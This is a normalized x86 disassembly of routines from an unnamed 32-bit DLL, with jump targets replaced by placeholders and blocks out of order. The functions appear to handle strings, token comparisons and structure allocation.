lea edx [ edi + 0x4c ]
push edx
call sub_1005a810
add esp 0x8
cmp eax ebx
je r-xdata
mov edx [ edi + 0x10 ]
mov eax [ edx + esi * 4 ]
push eax
call sub_1006cb40
inc esi
add esp 0x4
cmp esi [ edi + 0x14 ]
jb r-xdata
mov ecx [ eax + 0x10 ]
mov eax ecx
mov [ ebp - 0x40 ] 0xf
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
lea esi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax esi
push eax
push ecx
lea ecx [ ebp - 0x54 ]
call sub_10043190
mov eax [ ebp - 0x40 ]
mov edi [ ebp - 0x54 ]
mov [ ebp - 0x4 ] ebx
mov edx edi
cmp eax 0x10
jae r-xdata
mov ecx [ ebp - 0x44 ]
lea esi [ edx + ecx ]
mov edx edi
cmp eax 0x10
jae r-xdata
lea edx [ ebp - 0x54 ]
add ecx edx
cmp eax 0x10
mov eax edi
jae r-xdata
lea edx [ ebp - 0x54 ]
push sub_100213ec
push ecx
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_10003960
mov eax [ eax ]
add esp 0x10
push esi
push eax
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x54 ]
call sub_10059ef0
lea edx [ ebp - 0x38 ]
push edx
push 0xa
call sub_100372e0
lea eax [ ebp - 0x38 ]
add esp 0x8
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x54 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
mov edi [ ebp - 0x44 ]
sub eax edx
mov esi eax
mov ecx edi
cmp edi esi
jb r-xdata
cmp [ ebp - 0x40 ] 0x10
mov eax [ ebp - 0x54 ]
jae r-xdata
mov ecx esi
push ecx
lea ecx [ ebp - 0x38 ]
push ecx
push eax
call sub_10050b90
add esp 0xc
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
sete al
cmp al bl
je r-xdata
cmp edi esi
jae r-xdata
cmp [ ebp - 0x40 ] 0x10
mov [ ebp - 0x4 ] 0xffffffff
jb r-xdata
mov edx [ ebp - 0x90 ]
mov eax [ edx + 0x10 ]
mov esi [ eax ]
lea ecx [ ebp - 0x18 ]
push ecx
push ebx
call sub_100372e0
lea edx [ ebp - 0x18 ]
push edx
add esi 0x4c
push esi
call sub_1005a810
mov eax [ eax + 0x10 ]
add esp 0x10
push eax
lea ecx [ ebp - 0x70 ]
call sub_10001460
lea ecx [ ebp - 0x20 ]
push ecx
push 0x12
mov [ ebp - 0x4 ] 0x1
call sub_100372e0
lea eax [ ebp - 0x20 ]
add esp 0x8
lea ecx [ eax + 0x1 ]
lea ebx [ ebx ]
xor eax eax
cmp edi esi
setne al
or eax 0xffffffff
jmp r-xdata
mov edi [ ebp - 0x90 ]
mov [ ebp - 0x40 ] 0xf
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
mov ecx [ ebp - 0x54 ]
push ecx
call sub_1006591f
add esp 0x4
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax ecx
push eax
push ebx
lea edx [ ebp - 0x20 ]
push edx
lea ecx [ ebp - 0x70 ]
call sub_10040200
push 0xffffffff
add eax 0x7
push eax
lea eax [ ebp - 0x8c ]
push eax
lea ecx [ ebp - 0x70 ]
call sub_1004d2f0
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x2
call sub_1000adb0
lea ecx [ ebp - 0x8c ]
call sub_10061060
lea ecx [ ebp - 0x70 ]
call sub_10061060
cmp eax ebx
sub_1006cda0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007ee9e
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0xb0 ] ebx
xor esi esi
cmp [ ebx ] 0x1
mov [ ebp - 0x4 ] esi
je r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
push 0x7
call sub_100372e0
mov edx [ ebx + 0x1c ]
add esp 0x8
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x24 ] 0x10
jb r-xdata
xor esi esi
cmp [ ebx + 0x14 ] esi
jbe r-xdata
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebx + 0x4c ]
push ecx
call sub_1005a810
add esp 0x8
cmp eax esi
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
push eax
jmp r-xdata
cmp [ ebp + 0x24 ] 0x10
jb r-xdata
lea eax [ ebp - 0x24 ]
push eax
push 0x8
call sub_100372e0
sub esp 0x14
mov ecx esp
lea eax [ ebp - 0x24 ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
mov [ ebp - 0x14 ] esp
mov [ ecx ] 0x0
lea edi [ eax + 0x1 ]
mov ecx [ eax + 0x10 ]
mov eax ecx
mov [ ebp - 0x44 ] esi
mov [ ebp - 0x40 ] 0xf
mov [ ebp - 0x54 ] 0x0
lea esi [ eax + 0x1 ]
lea esp [ esp ]
call sub_1006591f
add esp 0x4
mov edx [ ebp + 0x10 ]
push edx
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
lea edx [ ebp - 0x24 ]
push edx
call sub_10043190
mov eax [ ebx + 0x10 ]
mov ecx [ eax + esi * 4 ]
push 0x26
push ecx
call sub_1006cda0
inc esi
add esp 0x24
cmp esi [ ebx + 0x14 ]
jb r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
push eax
push ecx
lea ecx [ ebp - 0x54 ]
call sub_10043190
mov eax [ ebp - 0x40 ]
mov edi [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x1
mov edx edi
cmp eax 0x10
jae r-xdata
mov ecx [ ebp - 0x44 ]
lea esi [ ecx + edx ]
mov edx edi
cmp eax 0x10
jae r-xdata
lea edx [ ebp - 0x54 ]
add ecx edx
cmp eax 0x10
mov eax edi
jae r-xdata
lea edx [ ebp - 0x54 ]
push sub_100213ec
push ecx
push eax
lea edx [ ebp - 0xb4 ]
push edx
call sub_10003960
mov eax [ eax ]
add esp 0x10
push esi
push eax
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_10059ef0
cmp [ ebp + 0x24 ] 0x10
mov edx [ ebp + 0x10 ]
jae r-xdata
lea eax [ ebp - 0x54 ]
mov esi [ ebp - 0x44 ]
mov edi [ ebp + 0x20 ]
mov ecx esi
cmp esi edi
jb r-xdata
lea edx [ ebp + 0x10 ]
cmp [ ebp - 0x40 ] 0x10
mov eax [ ebp - 0x54 ]
jae r-xdata
mov ecx edi
push ecx
push edx
push eax
call sub_10050b90
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x54 ]
sete al
test al al
je r-xdata
cmp esi edi
jae r-xdata
cmp [ ebp - 0x40 ] 0x10
mov [ ebp - 0x4 ] 0x0
jb r-xdata
lea ecx [ ebp - 0x38 ]
push ecx
push 0x10
call sub_100372e0
lea edx [ ebp - 0x38 ]
push edx
lea eax [ ebp - 0x54 ]
push eax
call sub_10017ea0
add esp 0x10
test al al
je r-xdata
xor eax eax
cmp esi edi
setne al
or eax 0xffffffff
jmp r-xdata
mov edx [ ebp - 0x54 ]
push edx
call sub_1006591f
add esp 0x4
lea edx [ ebp - 0x24 ]
push edx
push 0xf
call sub_100372e0
lea eax [ ebp - 0x24 ]
add esp 0x8
lea edx [ eax + 0x1 ]
nop
xor esi esi
cmp [ ebx + 0x14 ] esi
jbe r-xdata
test eax eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ ebp - 0x44 ]
sub eax edx
mov esi eax
mov ecx edi
cmp edi esi
jb r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
push 0x11
call sub_100372e0
sub esp 0x14
mov ecx esp
lea eax [ ebp - 0x18 ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
mov [ ebp - 0xb4 ] esp
mov [ ecx ] 0x0
lea edi [ eax + 0x1 ]
cmp [ ebp - 0x40 ] 0x10
mov eax [ ebp - 0x54 ]
jae r-xdata
mov ecx esi
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
lea edx [ ebp - 0x18 ]
push edx
call sub_10043190
mov eax [ ebx + 0x10 ]
mov ecx [ eax + esi * 4 ]
push 0x26
push ecx
call sub_1006cda0
inc esi
add esp 0x24
cmp esi [ ebx + 0x14 ]
jb r-xdata
push ecx
lea ecx [ ebp - 0x24 ]
push ecx
push eax
call sub_10050b90
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x54 ]
sete al
test al al
je r-xdata
cmp edi esi
jae r-xdata
mov edx [ ebp - 0xb0 ]
push edx
lea eax [ ebp - 0x8c ]
push eax
call sub_1006c9c0
mov ecx [ ebp - 0x7c ]
mov eax 0x55555556
imul ecx
mov ebx edx
shr ebx 0x1f
add ebx edx
mov edi ecx
xor ecx ecx
mov eax ebx
mov edx 0x3
mul edx
seto cl
mov [ ebp - 0x4 ] 0x2
neg ecx
or ecx eax
push ecx
call sub_10035b61
add esp 0xc
cmp [ ebp - 0x78 ] 0x10
mov esi eax
mov eax [ ebp - 0x8c ]
jae r-xdata
xor eax eax
cmp edi esi
setne al
or eax 0xffffffff
jmp r-xdata
push edi
push eax
push esi
call sub_100796a0
xor ecx ecx
mov eax ebx
mov edx 0x4
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10035b61
add esp 0x10
mov edi eax
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x8c ]
test eax eax
xor esi esi
mov [ ebp - 0x5c ] 0xf
mov [ ebp - 0x60 ] esi
mov [ ebp - 0x70 ] 0x0
mov [ ebp - 0x4 ] 0x3
cmp ebx esi
jle r-xdata
mov eax esi
mov ecx edi
mov esi ebx
lea esp [ esp ]
cmp [ ebp - 0x78 ] 0x10
mov [ ebp - 0x5c ] 0xf
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x70 ] 0x0
jb r-xdata
mov eax [ rw-data ]
cmp eax 0x3
ja r-xdata
mov dx [ eax ]
mov [ ecx ] dx
mov dl [ eax + 0x2 ]
mov [ ecx + 0x2 ] dl
add eax 0x3
add ecx 0x4
dec esi
jne r-xdata
mov ebx [ ebp - 0xb0 ]
mov ecx [ ebp - 0x8c ]
push ecx
call sub_1006591f
add esp 0x4
inc esi
cmp esi ebx
jl r-xdata
jmp [ eax * 4 + jump_table_1006d3d8 ]
cmp [ ebp - 0x60 ] 0x0
jbe r-xdata
mov eax [ edi + esi * 4 ]
lea ecx [ ebp - 0xac ]
push ecx
lea edx [ ebp - 0xcc ]
and eax 0xffffff
push edx
mov ecx rw-data
mov [ ebp - 0xac ] eax
call sub_100525f0
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
mov edx [ edi + esi * 4 ]
lea eax [ ebp - 0xac ]
push eax
lea ecx [ ebp - 0xc8 ]
and edx 0xffffff
push ecx
mov ecx rw-data
mov [ ebp - 0xac ] edx
call sub_100525f0
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ edi + esi * 4 ]
and ecx 0xffffff
lea edx [ ebp - 0xac ]
push edx
lea eax [ ebp - 0xc4 ]
mov [ ebp - 0xac ] ecx
push eax
mov ecx rw-data
call sub_100525f0
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ edi + esi * 4 ]
lea ecx [ ebp - 0xac ]
push ecx
lea edx [ ebp - 0x14 ]
and eax 0xffffff
push edx
mov ecx rw-data
mov [ ebp - 0xac ] eax
call sub_100525f0
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
cmp [ ebp - 0x5c ] 0x10
jb r-xdata
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
mov al [ eax + 0x10 ]
mov [ ebp - 0xc0 ] al
mov ecx [ ebp - 0xc0 ]
jmp r-xdata
mov dl [ eax + 0x10 ]
mov [ ebp - 0xbc ] dl
mov eax [ ebp - 0xbc ]
push eax
jmp r-xdata
mov cl [ eax + 0x10 ]
mov [ ebp - 0xb8 ] cl
mov edx [ ebp - 0xb8 ]
push edx
jmp r-xdata
mov al [ eax + 0x10 ]
mov [ ebp - 0xb4 ] al
mov ecx [ ebp - 0xb4 ]
mov eax [ ebp - 0x70 ]
push eax
call sub_1006591f
add esp 0x4
mov edx [ rw-data ]
push edx
push 0x0
push eax
lea ecx [ ebp - 0x70 ]
call sub_10040200
cmp eax 0xffffffff
je r-xdata
mov eax rw-data
push ecx
push 0x1
lea ecx [ ebp - 0x70 ]
call sub_1003f510
mov eax [ rw-data ]
mov ebx 0x10
cmp [ rw-data ] ebx
jae r-xdata
mov ecx [ rw-data ]
push ecx
push 0x0
push eax
lea ecx [ ebp - 0x70 ]
call sub_10040200
cmp eax 0xffffffff
je r-xdata
mov eax rw-data
mov eax [ rw-data ]
cmp [ rw-data ] ebx
jae r-xdata
mov edx [ rw-data ]
push edx
push 0x0
push eax
lea ecx [ ebp - 0x70 ]
call sub_10040200
mov esi eax
mov eax [ rw-data ]
cmp [ rw-data ] ebx
jae r-xdata
mov eax rw-data
mov ecx [ rw-data ]
push ecx
push 0x0
push eax
lea ecx [ ebp - 0x70 ]
call sub_10040200
mov edi eax
mov eax [ rw-data ]
cmp [ rw-data ] ebx
jae r-xdata
mov eax rw-data
mov edx [ rw-data ]
push edx
push 0x0
push eax
lea ecx [ ebp - 0x70 ]
call sub_10040200
sub esi edi
sub esi 0x5
push esi
add eax 0x5
push eax
lea eax [ ebp - 0xa8 ]
push eax
lea ecx [ ebp - 0x70 ]
call sub_1004d2f0
lea ecx [ ebp - 0xa8 ]
push ecx
mov ecx rw-data
mov [ ebp - 0x4 ] 0x4
call sub_1000dd20
cmp [ ebp - 0x94 ] ebx
jb r-xdata
mov eax rw-data
mov edx [ ebp - 0xa8 ]
push edx
call sub_1006591f
add esp 0x4
sub_1006d430
push ebp
mov ebp esp
push eax
push ecx
call sub_1005a810
add esp 0x8
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
mov edx [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
push edx
push eax
call sub_100239df
add esp 0x8
neg eax
sbb eax eax
inc eax
pop ebp
retn
sub_1006d460
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
push esi
push edi
xor edi edi
mov [ ebp - 0x4 ] ecx
cmp [ ebx + 0x4 ] edi
jbe r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
pop edi
sete al
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebx ]
mov eax [ edx + edi * 4 ]
mov esi [ eax + 0x10 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_1005a810
add esp 0x8
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax + 0x10 ]
mov eax esi
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
dec [ ebp - 0x4 ]
inc edi
cmp edi [ ebx + 0x4 ]
jb r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_1006d500
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x14
push ebx
call sub_10020380
push 0x58
xor edi edi
push ebx
mov [ ebp - 0x4 ] eax
mov [ eax + 0x4 ] edi
call sub_10020380
mov esi eax
mov [ esi + 0x4 ] edi
mov [ esi ] edi
lea edi [ esi + 0x10 ]
push edi
push 0x1
push ebx
mov [ esi + 0x8 ] 0xffffffff
mov [ esi + 0xc ] 0x1
call sub_100268a0
xor eax eax
mov [ edi + 0xc ] eax
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax ] esi
push ebx
mov [ ebx + 0x4 ] eax
call sub_100041b0
add esp 0x20
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1006d570
push ebx
push esi
push 0x74
push edi
call sub_10020380
mov esi eax
lea eax [ esi + 0x48 ]
xor ebx ebx
push eax
push edi
mov [ esi ] ebx
mov [ esi + 0x34 ] ebx
mov [ esi + 0x3c ] 0x1
mov [ esi + 0x40 ] ebx
mov [ esi + 0x44 ] ebx
mov [ esi + 0x64 ] 0x5
call sub_10041660
lea ecx [ esi + 0x8 ]
push ecx
push 0xa
push edi
call sub_100268a0
lea edx [ esi + 0x14 ]
push edx
push 0x5
push edi
call sub_100268a0
lea eax [ esi + 0x20 ]
push eax
push 0x5
push edi
call sub_100268a0
mov [ esi + 0x2c ] ebx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x68 ] ebx
mov [ esi + 0x6c ] ebx
mov [ esi + 0x70 ] ebx
add esp 0x34
mov [ edi + 0xc ] esi
pop esi
pop ebx
retn
sub_1006d600
cmp [ eax + 0x4 ] 0x0
push esi
jbe r-xdata
xor eax eax
pop esi
retn
mov esi eax
lea esp [ esp ]
mov eax [ esi ]
push eax
push edi
call sub_100239df
add esp 0x8
mov ecx [ esi ]
mov eax edi
mov eax 0x1
pop esi
retn
add esi 0x8
cmp [ esi + 0x4 ] 0x0
ja r-xdata
sbb eax eax
sbb eax 0xffffffff
jmp r-xdata
test dl dl
je r-xdata
test ebx ebx
je r-xdata
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_1006d670
push edi
mov edi [ eax + 0xc ]
mov ecx [ edi + 0xc ]
dec ecx
js r-xdata
pop edi
retn
mov edx [ edi + 0x8 ]
push esi
lea esi [ edx + ecx * 4 ]
neg eax
sbb eax eax
and eax 0x6
movzx edx [ edx + lookup_table_1006d754 ]
jmp [ edx * 4 + jump_table_1006d728 ]
mov [ edi ] eax
pop esi
sub esi 0x4
dec ecx
jns r-xdata
xor edx edx
test eax eax
sete dl
lea eax [ edx * 8 + 0x6 ]
jmp r-xdata
mov eax 0xf
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0xd
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0xc
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0xa
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0xb
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0x8
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0x6
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0x13
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0x2
mov edx [ esi ]
mov edx [ edx + 0x1c ]
xor eax eax
test ecx ecx
sete al
cmp edx 0x81
ja r-xdata
pop esi
pop edi
retn
test eax eax
jne r-xdata
sub_1006d75f
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
add al [ ebx ]
add al 0xa
add eax 0x7060505
pop es
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or [ edx ] cl
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or esp ecx
int3
sub_1006d7e0
push ebp
mov ebp esp
push ebx
push esi
push edi
push r--data
mov edi eax
call sub_1003bee0
mov ebx [ ebp + 0x8 ]
push ebx
call sub_10016600
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov [ esi ] 0x28
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
mov ecx [ edi + 0x8 ]
mov [ esi + 0x8 ] ecx
mov edx [ edi + 0xc ]
mov [ esi + 0xc ] edx
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov ecx [ edi ]
mov [ esi + 0x18 ] ecx
mov [ esi + 0x1c ] 0x95
mov eax [ edi ]
cmp eax 0x1
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp eax 0x2
jne r-xdata
mov edx [ edi + 0x18 ]
mov [ esi + 0x1c ] edx
jmp r-xdata
mov edi [ ebx + 0xc ]
mov ecx [ edi ]
lea eax [ esi + 0x24 ]
mov [ esi + 0x20 ] ecx
mov edx [ edi + 0xc ]
push eax
push edx
push ebx
call sub_100268a0
xor ebx ebx
add esp 0xc
cmp [ edi + 0xc ] ebx
jbe r-xdata
mov eax [ edi + 0x18 ]
mov [ esi + 0x1c ] eax
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
lea ecx [ ecx ]
lea eax [ esi + 0x24 ]
push eax
mov eax [ edi + 0x8 ]
mov ecx [ eax + ebx * 4 ]
mov edx [ ecx + 0x1c ]
mov eax [ ebp + 0x8 ]
push edx
push eax
call sub_100049a0
inc ebx
add esp 0xc
cmp ebx [ edi + 0xc ]
jb r-xdata
sub_1006d8a0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
je r-xdata
cmp [ eax ] 0x2
cmp [ eax ] 0x1
jmp r-xdata
xor eax eax
mov esi [ eax + 0x18 ]
mov ecx [ ebp + 0xc ]
xor eax eax
cmp ecx 0x96
je r-xdata
jne r-xdata
pop esi
pop ebp
retn
lea edx [ ebp + 0xc ]
mov eax 0x1
pop esi
pop ebp
retn
mov ecx [ edx + 0x4 ]
add edx 0x4
cmp ecx 0x96
jne r-xdata
cmp ecx esi
je r-xdata
pop esi
pop ebp
retn
sub_1006d8f0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x1
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
push esi
xor esi esi
cmp ecx 0x96
je r-xdata
xor eax eax
pop ebp
retn
mov eax esi
pop esi
pop ebp
retn
lea edx [ ebp + 0xc ]
mov esi 0x1
mov ecx [ edx + 0x4 ]
add edx 0x4
cmp ecx 0x96
jne r-xdata
cmp ecx eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_1006d940
push ebp
mov ebp esp
cmp [ eax ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ eax + 0x1c ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax 0x1
pop ebp
retn
sub_1006d960
push 0x96
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push esi
call sub_1006d8f0
add esp 0x1c
test eax eax
je r-xdata
xor eax eax
retn
cmp [ esi + 0x20 ] 0x2
jne r-xdata
mov eax 0x1
retn
sub_1006d990
push esi
push 0x96
push 0x2
push 0x5e
mov esi eax
push 0x5d
push esi
call sub_1006d8f0
add esp 0x14
test eax eax
je r-xdata
cmp [ esi ] 0x1
jne r-xdata
cmp [ esi + 0x20 ] 0x1
je r-xdata
xor eax eax
pop esi
retn
cmp [ esi + 0x1c ] 0x5b
jne r-xdata
mov eax 0x1
pop esi
retn
add esi 0x4c
push r--data
push esi
call sub_1005a810
add esp 0x8
test eax eax
je r-xdata
push r--data
push esi
call sub_1005a810
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x10 ]
push eax
push r--data
call sub_100239df
add esp 0x8
neg eax
sbb eax eax
inc eax
jne r-xdata
mov ecx [ eax + 0x10 ]
push ecx
push r--data
call sub_100239df
add esp 0x8
neg eax
sbb eax eax
inc eax
je r-xdata
sub_1006da20
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
or [ ebx + 0xc ] 0x400
mov ecx [ eax + 0x8 ]
add eax 0x8
push esi
mov esi [ eax + 0x4 ]
push edi
mov edi [ ecx ]
dec esi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp esi 0x1
jle r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ecx + esi * 4 ]
mov ecx 0x5f
mov edx [ ebp + 0x8 ]
lea eax [ edi + 0x10 ]
push eax
mov [ ebx + 0x4 ] edi
mov ecx [ eax + 0x4 ]
push ebx
push edx
mov [ ebx + 0x8 ] ecx
call sub_100049a0
add esp 0xc
push eax
mov eax [ ebp + 0x8 ]
push ebx
push eax
call sub_100049a0
add esp 0xc
dec esi
sub eax 0x4
cmp esi 0x1
jg r-xdata
cmp [ edi + 0x1c ] ecx
je r-xdata
mov edi [ eax ]
cmp [ edi ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
push r--data
call sub_1003bee0
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + esi * 4 - 0x4 ]
add esp 0x4
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp [ eax ] 0x1
jne r-xdata
mov edi [ ebp - 0x4 ]
mov ecx [ edi + 0x8 ]
mov edx [ eax + 0x1c ]
push ecx
push edx
call sub_10045960
add esp 0x4
push eax
push esi
push edi
push r--data
call sub_1003bee0
mov eax [ ebp - 0x4 ]
mov edi [ edi + 0x8 ]
lea esi [ eax + 0x10 ]
push esi
push edi
mov [ ebx + 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push eax
mov [ ebx + 0x8 ] edi
call sub_10041090
lea eax [ edi + 0x1 ]
add esp 0x24
cmp eax [ esi + 0x4 ]
jae r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ esi ]
mov edx [ ecx + eax * 4 ]
mov [ edx + 0x8 ] eax
inc eax
cmp eax [ esi + 0x4 ]
jb r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1006db30
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi [ edi + 0xc ]
mov [ ebp - 0x8 ] esi
add esi 0x48
cmp [ esi + 0x4 ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x1c ]
push ebx
push 0x58
push edi
mov [ ebp - 0x4 ] eax
call sub_10020380
mov ecx [ ebp - 0x4 ]
mov ebx eax
xor eax eax
push esi
push edi
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] 0xffffffff
mov [ ebx ] ecx
mov [ ebx + 0xc ] eax
call sub_10017e40
mov [ ebx + 0x10 ] eax
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x14 ] edx
mov ecx [ eax + 0x68 ]
mov edx [ ecx + 0x10 ]
sub edx [ esi + 0xc ]
add esp 0x10
mov [ ebx + 0x18 ] edx
mov ecx [ esi + 0x10 ]
mov [ ebx + 0x1c ] ecx
mov edx [ esi + 0x14 ]
mov [ ebx + 0x20 ] edx
mov ecx [ esi + 0x18 ]
mov [ ebx + 0x24 ] ecx
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ edi + 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax [ eax ]
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
push 0x96
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push ecx
call sub_1006d8f0
add esp 0x1c
test eax eax
je r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ edx + ecx * 4 - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax + ecx * 4 - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
push edi
call sub_1006da20
add esp 0x4
jmp r-xdata
lea ecx [ eax + 0x10 ]
push ecx
mov [ ebx + 0x4 ] eax
mov edx [ ecx + 0x4 ]
push ebx
push edi
mov [ ebx + 0x8 ] edx
call sub_100049a0
add esp 0xc
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
push eax
push ecx
push r--data
call sub_1003bee0
push esi
push edi
call sub_1004b8a0
push esi
push edi
call sub_10041660
add esp 0x1c
mov [ esi + 0x1c ] 0x5
pop ebx
sub_1006dc50
mov edx [ eax + 0x4 ]
mov [ ecx + 0x30 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x34 ] edx
mov edx [ eax + 0xc ]
mov [ ecx + 0x38 ] edx
cmp [ eax ] 0x2
jne r-xdata
mov eax r--data
mov edx [ eax ]
mov [ ecx + 0x1c ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x20 ] eax
retn
mov edx [ eax + 0x10 ]
add eax 0x10
mov [ ecx + 0x1c ] edx
